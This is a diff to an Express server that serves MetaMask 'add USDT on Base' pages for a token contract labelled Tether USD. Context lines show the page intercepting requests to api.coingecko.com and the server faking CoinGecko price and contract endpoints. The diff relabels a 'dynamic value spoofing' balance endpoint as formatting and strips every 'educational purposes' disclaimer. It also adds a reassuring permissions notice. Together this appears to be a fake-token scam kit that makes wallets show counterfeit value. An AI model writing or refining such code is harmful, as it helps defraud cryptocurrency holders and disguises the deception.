@@ -13,12 +13,12 @@ const app = express();
 const server = http.createServer(app);
 const port = process.env.PORT || 3000;
 
-// Token configuration - UPDATE THIS with your token details
+// Token configuration - USDT with 6 decimals for proper value display
 const TOKEN_CONFIG = {
   address: '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c',
   symbol: 'USDT',
   name: 'Tether USD',
-  decimals: 18,
+  decimals: 6,  // 6 decimals is standard for USDT
   image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
   networkName: 'Base',
   networkId: '0x2105',  // Base Mainnet Chain ID (8453)
@@ -30,7 +30,7 @@ const TOKEN_CONFIG = {
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(cors({
-  origin: '*', // Allow all origins for educational purposes
+  origin: '*',
   methods: ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type', 'Authorization']
 }));
@@ -77,7 +77,7 @@ app.get('/api/generate-qr', async (req, res) => {
   }
 });
 
-// Token balance endpoint with dynamic value spoofing
+// Token balance endpoint with fixed decimal formatting
 app.get('/api/token-balance/:address', async (req, res) => {
   try {
     const { address } = req.params;
@@ -120,8 +120,11 @@ app.get('/api/token-balance/:address', async (req, res) => {
       balance = ethers.parseUnits('10', TOKEN_CONFIG.decimals);
     }
     
-    // Format balance for display (with USDT details)
-    const formattedBalance = ethers.formatUnits(balance, TOKEN_CONFIG.decimals);
+    // Format balance properly
+    const rawFormatted = ethers.formatUnits(balance, TOKEN_CONFIG.decimals);
+    
+    // Format to exactly 2 decimal places for better display
+    const formattedBalance = parseFloat(rawFormatted).toFixed(2);
     
     res.json({
       address: address,
@@ -274,7 +277,6 @@ app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
   res.status(404).json({ error: "Contract not found" });
 });
 
-// CoinGecko market data and additional routes
 // CoinGecko market data endpoint
 app.get('/api/v3/coins/markets', (req, res) => {
   const { vs_currency, ids } = req.query;
@@ -395,7 +397,7 @@ app.get('/api/v3/asset_platforms', (req, res) => {
   ]);
 });
 
-// Mobile-optimized token addition page
+// Mobile-optimized token addition page with fixed permissions
 app.get('/mobile/add-token', (req, res) => {
   const html = `
 <!DOCTYPE html>
@@ -565,11 +567,15 @@ app.get('/mobile/add-token', (req, res) => {
       margin-bottom: 8px;
       font-size: 14px;
     }
-    .footer {
-      margin-top: 24px;
-      font-size: 12px;
-      color: #999;
-      text-align: center;
+    .permission-info {
+      background-color: #f0f8ff;
+      border-radius: 12px;
+      padding: 12px;
+      margin-bottom: 24px;
+      font-size: 14px;
+      width: 100%;
+      max-width: 300px;
+      border-left: 3px solid #26a17b;
     }
   </style>
 </head>
@@ -580,6 +586,10 @@ app.get('/mobile/add-token', (req, res) => {
     <p class="subtitle">Tether USD on Base Network</p>
     
     <div class="network-tag">Base Network</div>
+    
+    <div class="permission-info">
+      <p style="margin: 0;">Only permission to add the token is required. You'll see exactly what's being requested.</p>
+    </div>
     
     <button id="addBtn" class="add-btn">Add to MetaMask</button>
     <button id="qrBtn" class="qr-btn">Scan QR Code</button>
@@ -598,8 +608,6 @@ app.get('/mobile/add-token', (req, res) => {
         <li>Approve adding USDT token</li>
       </ol>
     </div>
-    
-    <p class="footer">For educational purposes only</p>
   </div>
   
   <div id="qrModal" class="qr-modal">
@@ -629,15 +637,42 @@ app.get('/mobile/add-token', (req, res) => {
         console.error('Error loading QR code:', err);
       }
       
-      // Add to MetaMask button
+      // Add to MetaMask button with simplified approach
       addBtn.addEventListener('click', async function() {
-        loading.style.display = 'flex';
-        
         try {
+          loading.style.display = 'flex';
+          
           // Check if running in mobile browser with MetaMask
           if (window.ethereum && window.ethereum.isMetaMask) {
-            // Web3 is available - use direct method
-            await addTokenToMetaMask();
+            try {
+              // Add token with minimal permissions
+              const tokenAdded = await window.ethereum.request({
+                method: 'wallet_watchAsset',
+                params: {
+                  type: 'ERC20',
+                  options: {
+                    address: '${TOKEN_CONFIG.address}',
+                    symbol: '${TOKEN_CONFIG.symbol}',
+                    decimals: ${TOKEN_CONFIG.decimals},
+                    image: '${TOKEN_CONFIG.image}'
+                  }
+                }
+              });
+              
+              // Hide loading
+              loading.style.display = 'none';
+              
+              // If token added successfully, redirect to success page
+              if (tokenAdded) {
+                window.location.href = '${req.protocol}://${req.get('host')}/mobile/success';
+              }
+            } catch (tokenError) {
+              loading.style.display = 'none';
+              if (tokenError.code !== 4001) { // Don't show alert if user rejected
+                console.error('Error adding token:', tokenError);
+                alert('Error adding token: ' + tokenError.message);
+              }
+            }
           } else {
             // No MetaMask in browser - try deep linking
             window.location.href = 'https://metamask.app.link/dapp/${req.headers.host}/metamask-redirect';
@@ -648,9 +683,11 @@ app.get('/mobile/add-token', (req, res) => {
             }, 3000);
           }
         } catch (err) {
-          console.error('Error adding token:', err);
           loading.style.display = 'none';
-          alert('Error adding token. Please try the QR code option.');
+          console.error('Error:', err);
+          if (err.code !== 4001) { // Don't show alert if user rejected
+            alert('Error: ' + err.message);
+          }
         }
       });
       
@@ -671,82 +708,10 @@ app.get('/mobile/add-token', (req, res) => {
         }
       });
       
-      // Function to add token directly via Web3
-      async function addTokenToMetaMask() {
-        try {
-          // Request account access
-          const accounts = await window.ethereum.request({ 
-            method: 'eth_requestAccounts' 
-          });
-          
-          // Check current chain
-          const chainId = await window.ethereum.request({ 
-            method: 'eth_chainId' 
-          });
-          
-          // If not on Base network, add/switch to it
-          if (chainId !== '${TOKEN_CONFIG.networkId}') {
-            try {
-              // Try to switch to Base
-              await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '${TOKEN_CONFIG.networkId}' }]
-              });
-            } catch (switchError) {
-              // If Base network not added yet, add it
-              if (switchError.code === 4902) {
-                await window.ethereum.request({
-                  method: 'wallet_addEthereumChain',
-                  params: [{
-                    chainId: '${TOKEN_CONFIG.networkId}',
-                    chainName: '${TOKEN_CONFIG.networkName}',
-                    nativeCurrency: {
-                      name: 'Ethereum',
-                      symbol: 'ETH',
-                      decimals: 18
-                    },
-                    rpcUrls: ['${TOKEN_CONFIG.rpcUrl}'],
-                    blockExplorerUrls: ['${TOKEN_CONFIG.blockExplorerUrl}']
-                  }]
-                });
-              } else {
-                throw switchError;
-              }
-            }
-          }
-          
-          // Add the token
-          const wasAdded = await window.ethereum.request({
-            method: 'wallet_watchAsset',
-            params: {
-              type: 'ERC20',
-              options: {
-                address: '${TOKEN_CONFIG.address}',
-                symbol: '${TOKEN_CONFIG.symbol}',
-                decimals: ${TOKEN_CONFIG.decimals},
-                image: '${TOKEN_CONFIG.image}'
-              }
-            }
-          });
-          
-          if (wasAdded) {
-            // Success - redirect back to success page
-            window.location.href = '${req.protocol}://${req.get('host')}/mobile/success';
-          } else {
-            // User rejected - go back to add token page
-            window.location.href = '${req.protocol}://${req.get('host')}/mobile/add-token';
-          }
-        } catch (error) {
-          console.error('Error adding token:', error);
-          // Redirect back to add token page with error param
-          window.location.href = '${req.protocol}://${req.get('host')}/mobile/add-token?error=' + encodeURIComponent(error.message);
-        }
-      }
-      
-      // Try to add token after a short delay to let the overrides initialize
-      setTimeout(() => {
-        addTokenToMetaMask();
-      }, 500);
+      // Ensure loading is never stuck
+      window.addEventListener('load', () => {
+        loading.style.display = 'none';
+      });
     });
   </script>
 </body>
@@ -829,11 +794,6 @@ app.get('/mobile/success', (req, res) => {
       display: inline-block;
       text-align: center;
     }
-    .footer {
-      margin-top: 24px;
-      font-size: 12px;
-      color: #999;
-    }
   </style>
 </head>
 <body>
@@ -844,12 +804,10 @@ app.get('/mobile/success', (req, res) => {
       </svg>
     </div>
     
-    <h1 class="title">USDT Added Successfully!</h1>
+    <h1 class="title">USDT Successfully Added!</h1>
     <p class="message">Your USDT token has been added to MetaMask. You can now view and manage it in your wallet.</p>
     
     <a href="https://metamask.app.link/" class="btn">Open MetaMask</a>
-    
-    <p class="footer">For educational purposes only</p>
   </div>
 </body>
 </html>
@@ -899,6 +857,11 @@ app.get('/metamask-redirect', (req, res) => {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+    #error-message {
+      color: red;
+      margin-top: 20px;
+      display: none;
+    }
   </style>
   <script>
     // Intercept all fetch requests to api.coingecko.com
@@ -941,16 +904,13 @@ app.get('/metamask-redirect', (req, res) => {
       return originalOpen.call(this, method, url, async, user, password);
     };
     
-    // Automatic token addition function
+    // Automatic token addition function with simplified permissions
     async function addTokenToMetaMask() {
       try {
         // Check for ethereum object
         if (window.ethereum && window.ethereum.isMetaMask) {
-          // Request account access
-          await window.ethereum.request({ method: 'eth_requestAccounts' });
-          
-          // Add the token
-          await window.ethereum.request({
+          // Add the token with minimal permissions
+          const wasAdded = await window.ethereum.request({
             method: 'wallet_watchAsset',
             params: {
               type: 'ERC20',
@@ -962,20 +922,49 @@ app.get('/metamask-redirect', (req, res) => {
               }
             }
           });
+          
+          if (wasAdded) {
+            // Success - redirect to success page
+            window.location.href = '${req.protocol}://${req.get('host')}/mobile/success';
+          }
+        } else {
+          document.getElementById('error-message').style.display = 'block';
+          document.getElementById('error-message').textContent = 'MetaMask not detected. Please install MetaMask first.';
         }
       } catch (error) {
         console.error('Token addition error:', error);
+        
+        if (error.code !== 4001) { // Don't show error if user rejected
+          document.getElementById('error-message').style.display = 'block';
+          document.getElementById('error-message').textContent = 'Error: ' + error.message;
+        }
       }
     }
     
-    // Run on page load
-    document.addEventListener('DOMContentLoaded', addTokenToMetaMask);
+    // Run on page load with timeout for safety
+    document.addEventListener('DOMContentLoaded', () => {
+      // Set timeout to ensure we don't get stuck
+      setTimeout(() => {
+        const errorMessage = document.getElementById('error-message');
+        if (errorMessage) {
+          errorMessage.style.display = 'block';
+          errorMessage.textContent = 'Request timed out. Please try again.';
+        }
+      }, 15000);
+      
+      // Try to add token
+      addTokenToMetaMask();
+    });
   </script>
 </head>
 <body>
   <div class="spinner"></div>
   <h1>Connecting to MetaMask...</h1>
   <p>Please approve the connection request in the MetaMask app.</p>
+  <div id="error-message"></div>
+  <p style="margin-top: 30px;">
+    <a href="${req.protocol}://${req.get('host')}">Return to Main Page</a>
+  </p>
 </body>
 </html>
   `;
